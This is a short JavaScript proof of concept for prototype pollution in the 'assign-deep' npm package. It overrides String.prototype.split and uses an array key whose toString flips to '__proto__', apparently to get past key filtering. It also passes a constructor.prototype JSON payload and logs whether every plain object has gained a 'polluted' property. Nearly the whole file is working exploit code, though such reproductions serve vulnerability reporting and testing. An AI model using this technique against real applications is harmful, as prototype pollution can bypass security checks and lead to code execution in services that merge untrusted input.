var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const assign = require('assign-deep');
const payloads = ['{"constructor": {"prototype": {"polluted":"yes"}}}'];
var obj = {};
console.log({}.polluted);
assign({}, JSON.parse(payloads[0]));
console.log({}.polluted);